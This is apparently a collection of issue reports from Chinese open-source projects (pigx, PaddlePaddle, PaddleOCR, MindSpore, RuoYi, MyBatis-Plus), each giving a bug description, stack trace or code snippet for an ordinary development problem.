com.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:155) at com.fasterxml.jackson.databind.ser.impl.IndexedListSerializer.serializeContents(IndexedListSerializer.java:119) at com.fasterxml.jackson.databind.ser.impl.IndexedListSerializer.serialize(IndexedListSerializer.java:79) at com.fasterxml.jackson.databind.ser.impl.IndexedListSerializer.serialize(IndexedListSerializer.java:18) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:727) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:719) at com.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:155) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:727) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:719) at com.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:155) at com.fasterxml.jackson.databind.ser.std.MapSerializer.serializeFields(MapSerializer.java:722) at com.fasterxml.jackson.databind.ser.std.MapSerializer.serialize(MapSerializer.java:643) at com.fasterxml.jackson.databind.ser.std.MapSerializer.serialize(MapSerializer.java:33) at com.fasterxml.jackson.databind.ser.BeanPropertyWriter.serializeAsField(BeanPropertyWriter.java:727) at com.fasterxml.jackson.databind.ser.std.BeanSerializerBase.serializeFields(BeanSerializerBase.java:719) at com.fasterxml.jackson.databind.ser.BeanSerializer.serialize(BeanSerializer.java:155) at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider._serialize(DefaultSerializerProvider.java:480) at com.fasterxml.jackson.databind.ser.DefaultSerializerProvider.serializeValue(DefaultSerializerProvider.java:319) at com.fasterxml.jackson.databind.ObjectMapper._configAndWriteValue(ObjectMapper.java:3905) at com.fasterxml.jackson.databind.ObjectMapper.writeValueAsString(ObjectMapper.java:3219) at springfox.documentation.spring.web.json.JsonSerializer.toJson(JsonSerializer.java:38) at springfox.documentation.swagger2.web.Swagger2Controller.getDocumentation(Swagger2Controller.java:105) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:189) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:102) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:800) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1038) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005) at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:897) at javax.servlet.http.HttpServlet.service(HttpServlet.java:645) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.boot.actuate.web.trace.servlet.HttpTraceFilter.doFilterInternal(HttpTraceFilter.java:90) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:320) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:127) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:91) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:137) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:111) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:170) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:116) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:74) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:56) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:334) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:215) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:178) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:357) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:270) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.filterAndRecordMetrics(WebMvcMetricsFilter.java:117) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:106) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.pig4cloud.pigx.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:59) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:364) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748)   <code>: http://pigx-gateway:9999/swagger-ui.html?urls.primaryName=pigx-upms-biz 谷歌浏览器访问http://pigx-gateway:9999/swagger-ui.html,然后选择umps模块，后台upms控制台直接报错java.lang.NumberFormatException: For input string: """""
LodTensor lod含义的疑问,"在sequence_expand的例子中有一个 不太理解这儿的lod = [[[0,2,4]]是什么意思，它对应的batch每个input是什么样的呢？我理解的不应该是batch里每个input的sequence长度吗？像设计文档中提到的。   <code>: x is a LoDTensor: x.lod = [[0, 2, 4]] x.data = [[a], [b], [c], [d]] x.dims = [4, 1] 3 1 2 ||| | ||"
校验nextWrapper的执行结果的疑问,"V1.4版本 以上编排 w0、w4任一均可触发w5 w1、w4任一均可触发w6 w5、w6任一均可触发w7 代码如下： 以当前的方法判断，w3和w4还是会执行的。 如果要w3和w4不执行，是不是可以在时，做以下判断呢？ 即：所有next中只要有一个没执行，当前worker就要执行；如果都执行了，当前worker就不执行。 我验证这样改是可以使 w3，w4 不执行的。 不过我看属性有注释： 注意，该属性仅在nextWrapper数量&lt;=1时有效，&gt;1时的情况是不存在的 不知道上面我提到的那种情况是不是不支持呢？ 附修改后的执行结果：   <code>: w0(1s)----------------------w5(1s)------\ / \ w2(1.3s)-----w3(0.3s)-----w4(0.2s) |------w7(1s) \ / w1(1s)----------------------w6(1s)------/ private static void t() throws ExecutionException, InterruptedException { ParWorker w = new ParWorker(); ParWorker1 w1 = new ParWorker1(); ParWorker2 w2 = new ParWorker2(); w2.setSleepTime(1300); ParWorker3 w3 = new ParWorker3(); w3.setSleepTime(300); ParWorker4 w4 = new ParWorker4(); w4.setSleepTime(200); ParWorker5 w5 = new ParWorker5(); ParWorker6 w6 = new ParWorker6(); ParWorker7 w7 = new ParWorker7(); WorkerWrapper&lt;String, String&gt; wrapperW7 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w7) .callback(w7) .param(""w7"") .build(); WorkerWrapper&lt;String, String&gt; wrapperW5 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w5) .callback(w5) .param(""w5"") .next(wrapperW7, false) .build(); WorkerWrapper&lt;String, String&gt; wrapperW6 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w6) .callback(w6) .next(wrapperW7, false) .param(""w6"") .build(); WorkerWrapper&lt;String, String&gt; wrapperW0 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w) .callback(w) .param(""w0"") .next(wrapperW5, false) .build(); WorkerWrapper&lt;String, String&gt; wrapperW1 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w1) .callback(w1) .param(""w1"") .next(wrapperW6, false) .build(); WorkerWrapper&lt;String, String&gt; wrapperW4 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w4) .callback(w4) .param(""w4"") .next(wrapperW5, false) .next(wrapperW6, false) .build(); WorkerWrapper&lt;String, String&gt; wrapperW3 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w3) .callback(w3) .param(""w3"") .next(wrapperW4) .build(); WorkerWrapper&lt;String, String&gt; wrapperW2 = new WorkerWrapper.Builder&lt;String, String&gt;() .worker(w2) .callback(w2) .param(""w2"") .next(wrapperW3) .build(); long a = System.currentTimeMillis(); Async.beginWork(4000, Executors.newCachedThreadPool(), wrapperW0, wrapperW1, wrapperW2); System.out.println(System.currentTimeMillis() - a); Async.shutDown(); } checkNextWrapperResult nextWrappers.size() != 1 private boolean checkNextWrapperResult() { if (nextWrappers == null) { return getState() == INIT; } if (nextWrappers.size() != 1) { for (WorkerWrapper&lt;?, ?&gt; wrapper : nextWrappers) { if (wrapper.getState() == INIT) { return true; } } return false; } // ... } needCheckNextWrapperResult worker0 doing... worker2 doing... worker1 doing... callback worker0 success--1616076482014----result = 1616076482014---param = w0 from 0-threadName:pool-1-thread-1 worker5 doing... callback worker1 success--1616076482015----result = 1616076482015---param = w1 from 1-threadName:pool-1-thread-2 worker6 doing... callback worker2 success--1616076482313----result = 1616076482313---param = w2 from 2-threadName:pool-1-thread-3 callback worker3 failure--1616076482313----worker3--default-threadName:pool-1-thread-3 callback worker4 failure--1616076482313----worker4--default-threadName:pool-1-thread-3 callback worker5 success--1616076483015----result = 1616076483015---param = w5 from 4-threadName:pool-1-thread-1 worker7 doing... callback worker6 success--1616076483016----result = 1616076483016---param = w6 from 4-threadName:pool-1-thread-2 callback worker7 success--1616076484015----result = 1616076484015---param = w7 from 4-threadName:pool-1-thread-1 3072"
reduce ut time of cutmix_batch and concatop,"Task Use this template for task tracking kind/task Task Description We have two UTs named and . It takes 7s-8s to pass it under normal node. It takes nearly 8 hours to pass it under ASAN check mode. So we have to reduce its time cost. Task Goal Sub Task No. Task Description Issue ID 1 2   <code>: TEST_F(MindDataTestCutMixBatchOp, TestSuccess1) TEST_F(MindDataTestConcatOp, TestConcatProject)"
按上面说的步骤报错了,"CMakeFiles/ocr_system.dir/src/ocr_rec.o: In function paddle_infer::Predictor::GetInputNames()' /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_rec.cpp:47: undefined reference to paddle_infer::Predictor::GetOutputNames()' /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_rec.cpp:54: undefined reference to PaddleOCR::CRNNRecognizer::LoadModel(std::string const&amp;)': /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_rec.cpp:98: undefined reference to PaddleOCR::Classifier::Run(cv::Mat&amp;)': /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_cls.cpp:38: undefined reference to paddle_infer::Predictor::GetInputHandle(std::string const&amp;)' /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_cls.cpp:46: undefined reference to paddle_infer::Predictor::GetOutputHandle(std::string const&amp;)' CMakeFiles/ocr_system.dir/src/ocr_cls.o: In function `PaddleOCR::Classifier::LoadModel(std::string const&amp;)':   <code>: PaddleOCR::CRNNRecognizer::Run(std::vector&lt;std::vector&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::allocator&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt; &gt;, std::allocator&lt;std::vector&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt;, std::allocator&lt;std::vector&lt;int, std::allocator&lt;int&gt; &gt; &gt; &gt; &gt; &gt;, cv::Mat&amp;, PaddleOCR::Classifier*)': /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_rec.cpp:46: undefined reference to paddle_infer::Predictor::GetInputHandle(std::string const&amp;)' /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_rec.cpp:53: undefined reference to paddle_infer::Predictor::GetOutputHandle(std::string const&amp;)' CMakeFiles/ocr_system.dir/src/ocr_rec.o: In function paddle::AnalysisConfig::SetModel(std::string const&amp;, std::string const&amp;)' CMakeFiles/ocr_system.dir/src/ocr_cls.o: In function paddle_infer::Predictor::GetInputNames()' /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_cls.cpp:39: undefined reference to paddle_infer::Predictor::GetOutputNames()' /myproc/paddle/PaddleOCR/deploy/cpp_infer/src/ocr_cls.cpp:47: undefined reference to"
[鹏城实验室]BatchNorm的打印值和默认值不一致,，，中的默认值都是0.9，但是打印出来的值都是0.1，与默认值不一致。 /mode graph   <code>: mindspore.nn.BatchNorm1d mindspore.nn.BatchNorm2d mindspore.nn.BatchNorm3d momentum
[CT][MS][batchtospacend]batchtospacend raise ValueError on ascend,"batchtospacend raise ValueError on ascend / 硬件环境: ascend /device ascend z : -- MindSpore version :commit_id = ''[sha1]:afc602d1,[branch]:(HEAD,origin/r1.10,r1.10)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): graph/pynative /mode pynative /mode graph test_batch_to_space_nd_input_4x1x2x2_blockshape_float32 test_batch_to_space_nd_input_4x3x2x1_blockshape_float32 test_batch_to_space_nd_input_8x8x8x8_blockshape_float32 test_dynamic_shape_batch_to_space_nd_4x128x128x128_float16 test_dynamic_shape_batch_to_space_nd_4x1x1x1_int32 test_dynamic_shape_batch_to_space_nd_4x1x1x2_float16 test_dynamic_shape_batch_to_space_nd_4x1x8x8_float16 test_dynamic_shape_batch_to_space_nd_4x1x8x8_float32 test_dynamic_shape_batch_to_space_nd_4x2x1x3_float16 test_dynamic_shape_batch_to_space_nd_4x2x2x2_float16 test_dynamic_shape_batch_to_space_nd_4x8x8x8_float16 test_dynamic_shape_batch_to_space_nd_4x8x8x8_float32 test_dynamic_shape_batch_to_space_nd_float16 test_dynamic_shape_batch_to_space_nd_float32 test_dynamic_shape_batch_to_space_nd_4x1x1x1_block_1x1_float16 pytest -s -v dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py case pass test_dynamic_shape_batch_to_space_nd_4x1x1x1_block_1x1_float16   <code>: def test_batch_to_space_nd_input_4x1x2x2_blockshape_float32(): x = np.random.randn(4, 1, 2, 2).astype(np.float32) block_shape = [2, 2] crops = [[0, 0], [0, 0]] indices_np = [0, 3, 1, 2] fact = BatchToSpaceNDsShapeFactory(x, block_shape, crops, indices_np) &gt; fact.forward_cmp() ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:294: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:60: in forward_cmp out_ms = self.forward_mindspore_impl() ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:46: in forward_mindspore_impl out_ms = ms_net.construct(Tensor(self.x), Tensor(self.indices_np)) ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:31: in construct return self.batch_to_space_nd(input_x) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:296: in __call__ return _run_op(self, self.name, args) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:98: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[BatchToSpaceND]&lt;block_shape=[2, 2], crops=[[0, 0], [0, 0]]&gt; op_name = 'BatchToSpaceND' args = (Tensor(shape=[4, 1, 2, 2], dtype=Float32, value= [[[[-6.02548063e-01, 8.26927960e-01], [-7.49731138e-02, -7.74188...-2.45851159e-01, 2.12526649e-01]]], [[[ 1.95964301e+00, 1.72031224e-01], [ 4.19878095e-01, -8.49506080e-01]]]]),) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E ValueError: For 'BatchToSpaceND', the first dim of 'input_x' must be divisible by 'block_shape_prod'. But got first dim of 'input_x': -1, 'block_shape_prod' with value: 4. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/core/ops/batch_to_space_nd.cc:52 BatchToSpaceNDInferShape def test_dynamic_shape_batch_to_space_nd_4x1x1x1_block_1x1_float16(): x = np.random.randn(4, 1, 1, 1).astype(np.float16) block_shape = [1, 1] crops = [[0, 0], [0, 0]] indices_np = [0, 3, 1, 2] fact = BatchToSpaceNDsShapeFactory(x, block_shape, crops, indices_np) &gt; fact.forward_cmp() ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:502: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:60: in forward_cmp out_ms = self.forward_mindspore_impl() ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:46: in forward_mindspore_impl out_ms = ms_net.construct(Tensor(self.x), Tensor(self.indices_np)) ../dynamic_shape_operations/test_dynamic_shape_batch_to_space_nd.py:31: in construct return self.batch_to_space_nd(input_x) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:296: in __call__ return _run_op(self, self.name, args) /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/common/api.py:98: in wrapper results = fn(*arg, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ obj = Prim[BatchToSpaceND]&lt;block_shape=[1, 1], crops=[[0, 0], [0, 0]]&gt; op_name = 'BatchToSpaceND' args = (Tensor(shape=[4, 1, 1, 1], dtype=Float16, value= [[[[-4.2310e-01]]], [[[-4.5117e-01]]], [[[ 4.8291e-01]]], [[[ 1.0908e+00]]]]),) @_wrap_func def _run_op(obj, op_name, args): """"""Single op execution function supported by ge in PyNative mode."""""" &gt; output = real_run_op(obj, op_name, args) E RuntimeError: Single op compile failed, op: batch_to_space_nd_d_1682912539225970964_5 E except_msg: 2022-12-15 06:58:54.228794+00:00: Query except_msg:Traceback (most recent call last): E File ""/root/archiconda3/envs/op3.7/lib/python3.7/site-packages/te_fusion/parallel_compilation.py"", line 1643, in run E optional_input_mode=self._optional_input_mode) E File ""/root/archiconda3/envs/op3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1206, in build_single_op E opfunc = get_op_func(op_module, op_func_name, op_type, is_dynamic_impl) E File ""/root/archiconda3/envs/op3.7/lib/python3.7/site-packages/te_fusion/fusion_manager.py"", line 1048, in get_op_func E opm = importlib.import_module(op_module) E File ""/root/archiconda3/envs/op3.7/lib/python3.7/importlib/__init__.py"", line 127, in import_module E return _bootstrap._gcd_import(name[level:], package, level) E File ""&lt;frozen importlib._bootstrap&gt;"", line 1006, in _gcd_import E File ""&lt;frozen importlib._bootstrap&gt;"", line 983, in _find_and_load E File ""&lt;frozen importlib._bootstrap&gt;"", line 965, in _find_and_load_unlocked E ModuleNotFoundError: No module named 'impl.dynamic.batch_to_space_nd_d' E E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/ascend/kernel/tbe/tbe_kernel_compile.cc:471 QueryProcess /root/archiconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/primitive.py:733: RuntimeError"
表格“翻页记住选择”rememberSelected，功能异常,"最新版本已验证，问题存在， 该代码是在“翻页记住选择”示例的基础上增加了一列序号，该列排在整个“columns”的第二个，如果排在第三个，功能正常 简易代码如下： 情况2：如果引用复杂实体类型的值也会出现此问题，详见下图，实体“PathogenKb”继承了“BaseEntity”，如果我使用BaseEntity里的params的内容，也会功能异常 完整代码   <code>: columns: [{ field: 'state', checkbox: true }, { title: ""序号"", formatter: function(value, row, index) { return $.table.serialNumber(index); } }, { field: 'userId', title: '用户ID' }, columns: [{ field: 'state', checkbox: true }, { field: 'params.chipSn', title: '芯片编号' }, { field: 'userId', title: '用户ID' }, &lt;!DOCTYPE html&gt; &lt;html lang=""zh"" xmlns:th=""http://www.thymeleaf.org"" xmlns:shiro=""http://www.pollix.at/thymeleaf/shiro""&gt; &lt;head&gt; &lt;th:block th:include=""include :: header('翻页记住选择')"" /&gt; &lt;/head&gt; &lt;body class=""gray-bg""&gt; &lt;div class=""container-div""&gt; &lt;div class=""btn-group-sm"" id=""toolbar"" role=""group""&gt; &lt;a class=""btn btn-success"" onclick=""checkItem()""&gt; &lt;i class=""fa fa-check""&gt;&lt;/i&gt; 选中项 &lt;/a&gt; &lt;/div&gt; &lt;div class=""row""&gt; &lt;div class=""col-sm-12 select-table table-striped""&gt; &lt;table id=""bootstrap-table""&gt;&lt;/table&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div th:include=""include :: footer""&gt;&lt;/div&gt; &lt;script th:inline=""javascript""&gt; var prefix = ctx + ""demo/table""; var datas = [[${@dict.getType('sys_normal_disable')}]]; $(function() { var options = { url: prefix + ""/list"", rememberSelected: true, columns: [{ field: 'state', checkbox: true }, { title: ""序号"", formatter: function (value, row, index) { return $.table.serialNumber(index); } }, { field : 'userId', title : '用户ID' }, { field : 'userCode', title : '用户编号' }, { field : 'userName', title : '用户姓名' }, { field : 'userPhone', title : '用户手机' }, { field : 'userEmail', title : '用户邮箱' }, { field : 'userBalance', title : '用户余额' }, { field: 'status', title: '用户状态', align: 'center', formatter: function(value, row, index) { return $.table.selectDictLabel(datas, value); } }, { title: '操作', align: 'center', formatter: function(value, row, index) { var actions = []; actions.push('&lt;a class=""btn btn-success btn-xs"" href=""#""&gt;&lt;i class=""fa fa-edit""&gt;&lt;/i&gt;编辑&lt;/a&gt; '); actions.push('&lt;a class=""btn btn-danger btn-xs"" href=""#""&gt;&lt;i class=""fa fa-remove""&gt;&lt;/i&gt;删除&lt;/a&gt;'); return actions.join(''); } }] }; $.table.init(options); }); // 选中数据 function checkItem(){ // var arrays = $.table.selectColumns(""userId""); var arrays = $.table.selectColumns(""userCode""); alert(arrays); } &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;"
不知道是不是bug问题,"当前使用版本 v3.2.0 在查询已存在的数据，但是没有找到 User 对象使用的是 LocalDateTime，数据库对应类型是 DateTime； 在 = 条件下，参数是 LocalDate 类型找不到当天的数据，String 类型类型可以； 在 &lt;= 条件下，可以找到数据 无   <code>: QueryWrapper&lt;User&gt; wrapper = new QueryWrapper&lt;&gt;(); wrapper.apply(""DATE_FORMAT(create_time, '%Y-%m-%d') = {0}"", LocalDate.now()); List&lt;User&gt; userList = userMapper.selectList(wrapper); userList.forEach(System.out::println);"
华为V3接口实现,2. 在哪个步骤出现了问题？ 3. 您希望得到什么结果？   <code>: 目前华为登录使用的V2的接口似乎有些问题，无法登录。只改接口地址为V3的版本也无法成本请求，总是报20001错误 我本地已经开发好了V3接口的登录逻辑，希望提交代码成为贡献者，看是不是给开个分支。我提交上去你们看看没问题的话，就合并起来吧
